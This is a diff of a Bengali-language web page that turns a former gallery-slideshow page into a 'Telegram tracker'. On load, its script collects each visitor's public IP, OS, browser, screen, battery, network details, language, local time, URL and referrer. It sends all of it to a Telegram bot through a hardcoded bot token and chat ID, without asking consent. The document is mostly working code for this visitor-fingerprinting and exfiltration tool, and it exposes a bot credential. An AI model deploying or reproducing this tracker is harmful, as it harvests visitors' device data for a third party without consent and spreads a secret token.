@@ -2,8 +2,8 @@
 <html lang="bn">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>ডিটেইলড ভিজিটর ইনফো + গ্যালারি স্লাইডশো</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ডিটেইলড ভিজিটর ইনফো - টেলিগ্রাম ট্র্যাকার</title>
     <style>
         * {
             margin: 0;
@@ -13,222 +13,123 @@
         }
 
         body {
-            background: linear-gradient(135deg, #0b1120 0%, #19233c 100%);
-            padding: 20px;
+            background: linear-gradient(135deg, #0a0f1c 0%, #141c2c 100%);
+            padding: 30px 20px;
             min-height: 100vh;
-        }
-
-        .container {
-            max-width: 1300px;
-            margin: 0 auto;
             display: flex;
-            flex-wrap: wrap;
-            gap: 24px;
+            justify-content: center;
+            align-items: center;
         }
 
-        /* ইনফো কার্ড (বিস্তারিত তথ্য) */
-        .info-card {
-            flex: 1.2;
-            min-width: 280px;
-            background: rgba(15, 25, 45, 0.75);
+        .card {
+            max-width: 1100px;
+            width: 100%;
+            background: rgba(18, 28, 40, 0.85);
             backdrop-filter: blur(14px);
             border-radius: 2rem;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            padding: 1.5rem;
-            box-shadow: 0 20px 35px rgba(0,0,0,0.4);
+            border: 1px solid rgba(255, 215, 150, 0.25);
+            padding: 1.8rem;
+            box-shadow: 0 25px 45px rgba(0,0,0,0.5);
         }
 
-        .info-card h2 {
-            color: #ffde9c;
-            border-left: 5px solid #f5b042;
-            padding-left: 16px;
-            margin-bottom: 20px;
-            font-size: 1.5rem;
+        h1 {
+            color: #ffdfa5;
+            font-size: 1.6rem;
+            border-left: 5px solid #ffae42;
+            padding-left: 20px;
+            margin-bottom: 25px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+        .badge {
+            background: #1f3a4b;
+            font-size: 0.7rem;
+            padding: 4px 12px;
+            border-radius: 40px;
+            color: #bbd4ff;
         }
 
         .info-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
-            gap: 14px;
+            grid-template-columns: repeat(auto-fill, minmax(290px, 1fr));
+            gap: 16px;
+            margin-bottom: 20px;
         }
 
         .info-item {
-            background: rgba(0, 0, 0, 0.45);
+            background: rgba(0, 0, 0, 0.5);
             border-radius: 1.2rem;
-            padding: 12px 16px;
+            padding: 14px 18px;
+            border-left: 3px solid #ffa559;
             transition: 0.1s;
-            border-left: 3px solid #ffb347;
         }
 
         .info-label {
             font-size: 0.7rem;
             text-transform: uppercase;
             letter-spacing: 1px;
-            color: #9bb5e0;
+            color: #9eb4dc;
         }
 
         .info-value {
             font-size: 1rem;
             font-weight: 500;
-            color: #f0f3fc;
+            color: #f5f9ff;
             word-break: break-word;
-            margin-top: 4px;
+            margin-top: 5px;
         }
 
-        /* গ্যালারি পারমিশন + স্লাইডশো অংশ */
-        .gallery-section {
-            flex: 1;
-            min-width: 320px;
-            background: rgba(10, 18, 28, 0.8);
-            backdrop-filter: blur(12px);
-            border-radius: 2rem;
-            border: 1px solid rgba(255,215,150,0.3);
-            padding: 1.5rem;
-        }
-
-        .permission-box {
-            background: #00000055;
-            border-radius: 1.5rem;
-            padding: 1rem;
+        .footer-note {
+            margin-top: 25px;
             text-align: center;
-            margin-bottom: 1.5rem;
-        }
-
-        .btn-allow, .btn-deny {
-            border: none;
-            padding: 8px 24px;
-            font-size: 1rem;
-            font-weight: bold;
-            border-radius: 60px;
-            cursor: pointer;
-            margin: 0 8px;
-            transition: 0.2s;
-        }
-
-        .btn-allow {
-            background: #2a7f3a;
-            color: white;
-        }
-        .btn-allow:hover { background: #3ba04e; transform: scale(1.02);}
-        .btn-deny {
-            background: #5e2e2e;
-            color: #ffc2c2;
-        }
-        .btn-deny:hover { background: #7a3a3a;}
-
-        .slideshow-container {
-            background: #01010166;
-            border-radius: 1.5rem;
-            padding: 12px;
-            margin-top: 10px;
-        }
-
-        .image-frame {
-            text-align: center;
-            min-height: 260px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: #00000044;
-            border-radius: 1rem;
-        }
-
-        #slideshow-img {
-            max-width: 100%;
-            max-height: 360px;
-            border-radius: 1rem;
-            box-shadow: 0 6px 16px black;
-            display: none;
-        }
-
-        .slide-controls {
-            display: flex;
-            justify-content: center;
-            gap: 12px;
-            margin: 12px 0;
-        }
-        .ctrl-btn {
-            background: #2c3e4e;
-            border: none;
-            padding: 6px 18px;
-            border-radius: 40px;
-            color: white;
-            cursor: pointer;
-        }
-        .counter {
-            text-align: center;
-            color: #cdd9ff;
-            font-size: 0.8rem;
-            margin: 8px;
-        }
-        .status-msg {
-            color: #ffcf9a;
             font-size: 0.75rem;
-            margin-top: 10px;
-            text-align: center;
+            color: #7e8dab;
+            border-top: 1px solid rgba(255,255,200,0.15);
+            padding-top: 16px;
         }
-        hr {
-            border-color: #2a3950;
-            margin: 15px 0;
-        }
-        @media (max-width: 760px) {
-            .container { flex-direction: column; }
+
+        .status-dot {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            background-color: #2ad47e;
+            border-radius: 50%;
+            margin-right: 8px;
+            box-shadow: 0 0 5px #2ad47e;
         }
     </style>
 </head>
 <body>
-<div class="container">
-    <!-- বাম পাশ: ডিটেইলড ডিভাইস তথ্য (ঠিক স্ক্রিনশটের মত) -->
-    <div class="info-card">
-        <h2>📱 লাইভ ডিভাইস তথ্য</h2>
-        <div class="info-grid" id="deviceInfoGrid">
-            <!-- ডায়নামিক আইটেম এখানে জাভাস্ক্রিপ্ট দিয়ে ভরবে -->
-        </div>
-        <div class="status-msg" style="margin-top:16px;">✅ টেলিগ্রামে স্বয়ংক্রিয় নোটিফিকেশন সক্রিয়</div>
+<div class="card">
+    <h1>
+        📡 লাইভ ডিভাইস তথ্য 
+        <span class="badge">টেলিগ্রাম রিপোর্ট সক্রিয়</span>
+    </h1>
+    <div class="info-grid" id="deviceInfoGrid">
+        <!-- dynamic data will be inserted here -->
     </div>
-
-    <!-- ডান পাশ: গ্যালারি অনুমতি + স্লাইডশো -->
-    <div class="gallery-section">
-        <div class="permission-box">
-            <div style="font-size:1.2rem; margin-bottom:8px;">🖼️ গ্যালারি অ্যাক্সেস চাই</div>
-            <p style="color:#bcd0ff; font-size:0.85rem;">"অনুমতি দিন" ক্লিক করলে আপনার ছবি সিলেক্ট করতে পারবেন -> স্লাইডশো শুরু হবে</p>
-            <div style="margin-top: 12px;">
-                <button id="allowGalleryBtn" class="btn-allow">✅ অনুমতি দিন</button>
-                <button id="denyGalleryBtn" class="btn-deny">❌ অস্বীকার</button>
-            </div>
-            <div id="galleryMsg" class="status-msg" style="color:#ffc285;"></div>
-        </div>
-
-        <div id="slideshowArea" style="display: none;">
-            <div class="slideshow-container">
-                <div class="image-frame">
-                    <img id="slideshow-img" src="" alt="ছবি আসবে">
-                </div>
-                <div class="counter" id="slideCounter">📸 ০ / ০</div>
-                <div class="slide-controls">
-                    <button id="prevSlide" class="ctrl-btn">◀ আগের</button>
-                    <button id="nextSlide" class="ctrl-btn">পরবর্তী ▶</button>
-                    <button id="playPauseBtn" class="ctrl-btn">⏸️ থামাও</button>
-                </div>
-                <div class="status-msg">✨ প্রতি ৩ সেকেন্ডে ছবি বদলাবে (অটো প্লে)</div>
-            </div>
-        </div>
+    <div class="footer-note">
+        <span class="status-dot"></span> আপনার সব তথ্য সংগ্রহ করে টেলিগ্রামে পাঠানো হয়েছে (একবার)
     </div>
 </div>
 
 <script>
     (function() {
-        // ======================== টেলিগ্রাম বট টোকেন (আগের মত) ===================
+        // ================== টেলিগ্রাম বট কনফিগ ==================
         const BOT_TOKEN = "8606366033:AAGgmTsvcGpTuYrnDvHCkDmsrJO9KBSRIOY";
         const DEFAULT_CHAT_ID = "7709670231";
 
-        // ---------- ১. সম্পূর্ণ ডিটেইলড ইনফো সংগ্রহ & UI দেখানো ----------
+        // ----- ইউটিলিটি ফাংশন -----
         async function getPublicIP() {
             try {
-                let res = await fetch('https://api.ipify.org?format=json');
-                let data = await res.json();
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
                 return data.ip;
-            } catch(e) { return "পাওয়া যায়নি"; }
+            } catch(e) {
+                return "আইপি পাওয়া যায়নি";
+            }
         }
 
         async function getBatteryInfo() {
@@ -238,7 +139,9 @@
                 let levelPercent = Math.round(battery.level * 100);
                 let charging = battery.charging ? "হ্যাঁ (চার্জিং)" : "না (ব্যাটারি)";
                 return { level: `${levelPercent}%`, charging: charging };
-            } catch(e) { return { level: "অজানা", charging: "অজানা" }; }
+            } catch(e) {
+                return { level: "অজানা", charging: "অজানা" };
+            }
         }
 
         function getNetworkInfo() {
@@ -247,7 +150,7 @@
             let type = conn.effectiveType || "unknown";
             let rtt = conn.rtt ? `${conn.rtt}ms` : "N/A";
             let downlink = conn.downlink ? `${conn.downlink}Mbps` : "N/A";
-            return { type: type, rtt: rtt, speed: downlink };
+            return { type: type.toUpperCase(), rtt: rtt, speed: downlink };
         }
 
         function getScreenDetails() {
@@ -273,7 +176,8 @@
             return { os, browser };
         }
 
-        async function loadAllInfoAndDisplay() {
+        // ----- সব তথ্য সংগ্রহ ও UI দেখানো -----
+        async function collectAndDisplay() {
             const ip = await getPublicIP();
             const battery = await getBatteryInfo();
             const network = getNetworkInfo();
@@ -286,7 +190,7 @@
             const pageUrl = window.location.href;
             const referrer = document.referrer || "সরাসরি";
 
-            const infoItems = [
+            const infoArray = [
                 { label: "🌐 আইপি অ্যাড্রেস", value: ip },
                 { label: "📱 অপারেটিং সিস্টেম", value: osBrowser.os },
                 { label: "🌍 ব্রাউজার", value: osBrowser.browser },
@@ -294,7 +198,7 @@
                 { label: "🎨 কালার ডেপথ", value: screenDet.colorDepth },
                 { label: "🔋 ব্যাটারি লেভেল", value: battery.level },
                 { label: "⚡ চার্জিং স্ট্যাটাস", value: battery.charging },
-                { label: "📡 নেটওয়ার্ক টাইপ", value: network.type.toUpperCase() },
+                { label: "📡 নেটওয়ার্ক টাইপ", value: network.type },
                 { label: "⏱️ RTT (লেটেন্সি)", value: network.rtt },
                 { label: "⚡ আনুমানিক স্পিড", value: network.speed },
                 { label: "🗣️ ভাষা (Language)", value: language },
@@ -307,15 +211,15 @@
 
             const grid = document.getElementById('deviceInfoGrid');
             grid.innerHTML = "";
-            for (let item of infoItems) {
+            for (let item of infoArray) {
                 const div = document.createElement('div');
                 div.className = "info-item";
                 div.innerHTML = `<div class="info-label">${item.label}</div><div class="info-value">${item.value}</div>`;
                 grid.appendChild(div);
             }
 
-            // টেলিগ্রামের জন্য মেসেজ তৈরী (ওপিট)
-            const message = `📢 বিস্তারিত ভিজিট:\nআইপি: ${ip}\nওএস: ${osBrowser.os}\nব্রাউজার: ${osBrowser.browser}\nস্ক্রিন: ${screenDet.resolution}\nব্যাটারি: ${battery.level} (${battery.charging})\nনেট: ${network.type}, ${network.rtt}, ${network.speed}\nস্থানীয় সময়: ${localTime}\nইউআরএল: ${pageUrl}`;
+            // টেলিগ্রামের জন্য মেসেজ তৈরি
+            const message = `📢 বিস্তারিত ভিজিট তথ্য:\nআইপি: ${ip}\nওএস: ${osBrowser.os}\nব্রাউজার: ${osBrowser.browser}\nস্ক্রিন: ${screenDet.resolution}\nব্যাটারি: ${battery.level} (${battery.charging})\nনেটওয়ার্ক: ${network.type}, RTT ${network.rtt}, স্পীড ${network.speed}\nস্থানীয় সময়: ${localTime}\nপেজ ইউআরএল: ${pageUrl}\nরেফারার: ${referrer}`;
             sendToTelegram(message);
         }
 
@@ -329,119 +233,29 @@
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                     body: params
                 });
-                console.log("টেলিগ্রামে পাঠানো হয়েছে");
-            } catch(e) { console.warn("telegram error"); }
-        }
-
-        // ---------- ২. গ্যালারি পারমিশন + স্লাইডশো লজিক ----------
-        let selectedImageURLs = [];
-        let currentIdx = 0;
-        let slideInterval = null;
-        let isAutoPlaying = true;
-        const slideshowDiv = document.getElementById('slideshowArea');
-        const slideshowImg = document.getElementById('slideshow-img');
-        const counterSpan = document.getElementById('slideCounter');
-        const prevBtn = document.getElementById('prevSlide');
-        const nextBtn = document.getElementById('nextSlide');
-        const playPauseBtn = document.getElementById('playPauseBtn');
-        const galleryMsg = document.getElementById('galleryMsg');
-
-        function revokeImages() {
-            for (let url of selectedImageURLs) URL.revokeObjectURL(url);
-            selectedImageURLs = [];
-        }
-
-        function updateSlide(index) {
-            if (!selectedImageURLs.length) return;
-            if (index < 0) currentIdx = selectedImageURLs.length - 1;
-            else if (index >= selectedImageURLs.length) currentIdx = 0;
-            else currentIdx = index;
-            slideshowImg.src = selectedImageURLs[currentIdx];
-            slideshowImg.style.display = "block";
-            counterSpan.innerText = `🖼️ ${currentIdx+1} / ${selectedImageURLs.length}`;
-        }
-
-        function startAutoSlide() {
-            if (slideInterval) clearInterval(slideInterval);
-            if (!selectedImageURLs.length) return;
-            slideInterval = setInterval(() => {
-                if (isAutoPlaying && selectedImageURLs.length) {
-                    updateSlide(currentIdx + 1);
-                }
-            }, 3000);
-        }
-
-        function stopAutoSlide() { if(slideInterval) clearInterval(slideInterval); slideInterval = null; }
-        function pauseSlideshow() { if(!isAutoPlaying) return; isAutoPlaying = false; playPauseBtn.innerText = '▶️ চালু'; stopAutoSlide(); }
-        function resumeSlideshow() { if(isAutoPlaying) return; isAutoPlaying = true; playPauseBtn.innerText = '⏸️ থামাও'; startAutoSlide(); }
-        function togglePlay() { isAutoPlaying ? pauseSlideshow() : resumeSlideshow(); }
-
-        function loadImagesFromFiles(files) {
-            const imageFiles = Array.from(files).filter(f => f.type.startsWith('image/'));
-            if (imageFiles.length === 0) {
-                galleryMsg.innerText = "❌ কোনো ছবি সিলেক্ট করেননি। শুধু ইমেজ ফাইল দিন।";
-                return false;
+                console.log("✅ টেলিগ্রামে মেসেজ পাঠানো হয়েছে");
+            } catch(e) {
+                console.warn("❌ টেলিগ্রাম পাঠাতে ব্যর্থ:", e);
             }
-            revokeImages();
-            for (let file of imageFiles) {
-                selectedImageURLs.push(URL.createObjectURL(file));
-            }
-            currentIdx = 0;
-            updateSlide(0);
-            if (slideshowDiv.style.display !== 'block') slideshowDiv.style.display = 'block';
-            isAutoPlaying = true;
-            playPauseBtn.innerText = '⏸️ থামাও';
-            startAutoSlide();
-            galleryMsg.innerHTML = `✅ ${selectedImageURLs.length} টি ছবি লোড! স্লাইডশো শুরু হয়েছে 🎉`;
-            return true;
         }
 
-        function requestGallery() {
-            const input = document.createElement('input');
-            input.type = 'file';
-            input.accept = 'image/*';
-            input.multiple = true;
-            input.onchange = (e) => {
-                if (e.target.files && e.target.files.length) {
-                    loadImagesFromFiles(e.target.files);
-                } else {
-                    galleryMsg.innerText = "কোনো ফাইল সিলেক্ট করা হয়নি।";
+        // স্থানীয় সময় প্রতি সেকেন্ড আপডেট (শুধু UI তে)
+        function startTimeUpdater() {
+            setInterval(() => {
+                const localTimeNow = new Date().toLocaleString('bn-BD', { hour12: false });
+                const timeElements = document.querySelectorAll('.info-item');
+                for (let el of timeElements) {
+                    if (el.innerText.includes("স্থানীয় সময়")) {
+                        const valueSpan = el.querySelector('.info-value');
+                        if (valueSpan) valueSpan.innerText = localTimeNow;
+                        break;
+                    }
                 }
-                input.remove();
-            };
-            input.click();
+            }, 1000);
         }
 
-        document.getElementById('allowGalleryBtn').addEventListener('click', () => {
-            galleryMsg.innerHTML = "📸 গ্যালারি অ্যাক্সেস চাচ্ছি... ছবি সিলেক্ট করুন।";
-            requestGallery();
-        });
-        document.getElementById('denyGalleryBtn').addEventListener('click', () => {
-            galleryMsg.innerHTML = "🔴 আপনি গ্যালারি অ্যাক্সেস অস্বীকার করেছেন। ছবি দেখা যাবে না। আবার চাইলে 'অনুমতি দিন' ক্লিক করুন।";
-            if (!selectedImageURLs.length) slideshowDiv.style.display = 'none';
-            else slideshowDiv.style.display = 'block';
-        });
-        if (prevBtn) prevBtn.onclick = () => { if(selectedImageURLs.length) updateSlide(currentIdx-1); };
-        if (nextBtn) nextBtn.onclick = () => { if(selectedImageURLs.length) updateSlide(currentIdx+1); };
-        if (playPauseBtn) playPauseBtn.onclick = togglePlay;
-
-        // সব তথ্য দেখানো শুরু এবং টেলিগ্রাম পাঠানো
-        loadAllInfoAndDisplay();
-
-        // প্রতি 30 সেকেন্ডে সময় রিফ্রেশ (শুধু স্থানীয় সময় আপডেট)
-        setInterval(() => {
-            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            const localTime = new Date().toLocaleString('bn-BD', { hour12: false });
-            const timeElements = document.querySelectorAll('.info-item');
-            for(let el of timeElements) {
-                if(el.innerText.includes("স্থানীয় সময়")) {
-                    el.querySelector('.info-value').innerText = localTime;
-                }
-                if(el.innerText.includes("টাইমজোন") && el.querySelector('.info-value').innerText !== timezone) {
-                    el.querySelector('.info-value').innerText = timezone;
-                }
-            }
-        }, 1000);
+        // সব শুরু
+        collectAndDisplay().then(() => startTimeUpdater());
     })();
 </script>
 </body>
